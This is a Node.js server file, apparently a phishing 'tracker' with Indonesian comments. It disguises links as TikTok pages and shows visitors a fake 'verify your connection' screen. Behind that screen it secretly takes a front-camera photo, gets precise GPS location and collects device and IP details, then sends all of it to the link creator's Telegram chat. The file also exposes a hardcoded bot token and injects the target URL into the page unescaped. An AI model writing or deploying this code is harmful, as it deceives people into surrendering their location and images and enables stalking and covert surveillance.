// File: tracker.js
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { parse } = require('node-html-parser');
const FormData = require('form-data');
const { Buffer } = require('buffer');

const app = express();
const PORT = process.env.PORT || 3030;

const BOT_TOKEN = process.env.BOT_TOKEN || '7870651367:AAGwnaIPcXhbTVDcV9LE0vBRTpuIIKtpwFQ'; // Ganti dengan token Anda atau gunakan environment variable

if (!BOT_TOKEN) {
    console.error("FATAL: BOT_TOKEN tidak didefinisikan!");
    process.exit(1);
}

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

app.use(express.json({ limit: '10mb' }));
app.set("json spaces", 2);
app.use(cors());

// --- ROUTE UTAMA UNTUK PELACAKAN (Tidak ada perubahan di sini) ---
app.get('/w', async (req, res) => {
    // ... (Kode dari respons sebelumnya, tidak perlu diubah)
    const { url: targetUrl, creator: creatorId } = req.query;

    if (!targetUrl || !creatorId) {
        return res.status(400).send("Parameter 'url' dan 'creator' dibutuhkan.");
    }

    const userAgent = req.headers['user-agent'];
    const crawlerUserAgents = ['TelegramBot', 'facebookexternalhit', 'WhatsApp', 'Twitterbot', 'Discordbot'];
    const isCrawler = crawlerUserAgents.some(crawler => userAgent.includes(crawler));

    if (isCrawler) {
        try {
            const response = await axios.get(targetUrl);
            const root = parse(response.data);
            const getMetaTag = (prop) => root.querySelector(`meta[property="${prop}"]`)?.getAttribute('content') || '';
            const title = getMetaTag('og:title') || root.querySelector('title')?.text || 'Judul tidak ditemukan';
            const description = getMetaTag('og:description') || 'Deskripsi tidak ditemukan';
            const image = getMetaTag('og:image') || '[https://sf-tools.fastcal.net/tiktok-icon.png](https://sf-tools.fastcal.net/tiktok-icon.png)';

            return res.send(`
                <!DOCTYPE html>
                <html><head>
                    <meta charset="UTF-8">
                    <title>${title}</title>
                    <meta property="og:title" content="${title}" />
                    <meta property="og:description" content="${description}" />
                    <meta property="og:image" content="${image}" />
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                </head><body></body></html>`);
        } catch (error) {
            console.error('Error fetching target URL for crawler:', error);
            return res.send('Gagal mengambil metadata untuk preview.');
        }
    }

    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Connecting...</title>
        <style>
            @import url('[https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap](https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap)');
            body { background-color: #010101; color: #fff; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; text-align: center; }
            .container { max-width: 300px; padding: 20px; }
            .logo { width: 80px; height: 80px; margin-bottom: 20px; }
            h1 { font-size: 22px; margin-bottom: 10px; }
            p { font-size: 14px; color: #aaa; margin-bottom: 30px; }
            .spinner { border: 4px solid rgba(255, 255, 255, 0.2); border-left-color: #FE2C55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
            @keyframes spin { to { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <div class="container">
            <img src="[https://sf-tools.fastcal.net/tiktok-icon.png](https://sf-tools.fastcal.net/tiktok-icon.png)" alt="TikTok Logo" class="logo">
            <h1>Just a moment...</h1>
            <p>We need to verify your connection to continue. Please approve any requests from your browser.</p>
            <div class="spinner"></div>
        </div>

        <script>
            const redirectToTarget = () => {
                setTimeout(() => { window.location.href = "${targetUrl}"; }, 500);
            };

            async function logData(data) {
                try {
                    await fetch('/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                } catch (e) { console.error('Log Error:', e); }
            }

            async function getPermissions() {
                const data = {
                    creatorId: "${creatorId}",
                    targetUrl: "${targetUrl}",
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    location: 'Ditolak atau Tidak Tersedia',
                    camera: 'Ditolak atau Tidak Tersedia'
                };

                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
                    });
                    data.location = \`https://www.google.com/maps?q=\<span class="math-inline">\{position\.coords\.latitude\},\\</span>{position.coords.longitude}\`;
                } catch (e) {
                    console.warn('Geolocation failed:', e.message);
                }

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    data.camera = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) {
                    console.warn('Camera access failed:', e.message);
                    data.camera = 'Ditolak atau Tidak Tersedia';
                }

                await logData(data);
                redirectToTarget();
            }

            window.onload = getPermissions;
        </script>
    </body>
    </html>
    `);
});

// --- ROUTE UNTUK MENERIMA LOG & MENGIRIM KE TELEGRAM ---
app.post('/log', async (req, res) => {
    const data = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const creatorId = data.creatorId;

    if (!creatorId) {
        console.error("Log received without creatorId");
        return res.sendStatus(400);
    }

    let ipInfo = 'Tidak dapat mengambil info IP.';
    try {
        const ipRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,org`);
        if (ipRes.data.status === 'success') {
            ipInfo = `*Negara:* ${ipRes.data.country}\n*Kota:* ${ipRes.data.city}, ${ipRes.data.regionName}\n*ISP:* ${ipRes.data.isp}\n*Organisasi:* ${ipRes.data.org}`;
        }
    } catch (e) {
        console.error("Failed to fetch IP info:", e.message);
    }

    // *** MODIFIKASI FORMAT PESAN NOTIFIKASI ***
    const isCameraAllowed = data.camera.startsWith('data:image/jpeg;base64,');
    const cameraStatusText = isCameraAllowed ? '✅ Diizinkan (Gambar terlampir)' : data.camera;

    // Menghapus semua backtick ``, hanya menggunakan bold ** dan teks biasa
    const message =
`🎯 **TARGET MENGKLIK LINK ANDA!** 🎯
-----------------------------------
🔗 *U*RL Asli:** ${data.targetUrl}

🖥️ **Info Perangkat & Jaringan**
- **Alamat IP:** ${ip}
- **Detail IP:**\n${ipInfo}
- **User Agent:** ${data.userAgent}
- **Platform:** ${data.platform} (${data.screenWidth}x${data.screenHeight})
- **Bahasa:** ${data.language}

📍 **Izin yang didapat**
- **Lokasi:** ${data.location}
- **Status Kamera:** ${cameraStatusText}
`;

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: creatorId,
            text: message,
            parse_mode: 'Markdown', // Tetap Markdown untuk menghandle bold (**)
            disable_web_page_preview: true
        });

        if (isCameraAllowed) {
            const base64Data = data.camera.replace(/^data:image\/jpeg;base64,/, "");
            const imageBuffer = Buffer.from(base64Data, 'base64');
            
            const form = new FormData();
            form.append('chat_id', creatorId);
            form.append('photo', imageBuffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });
            form.append('caption', '📸 Gambar dari kamera target.');

            await axios.post(`${TELEGRAM_API}/sendPhoto`, form, {
                headers: form.getHeaders(),
            });
        }
    } catch (error) {
        console.error("Failed to send log to Telegram:", error.response?.data || error.message);
    }
    
    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Tracking server running on port ${PORT}`);
});

module.exports = app;
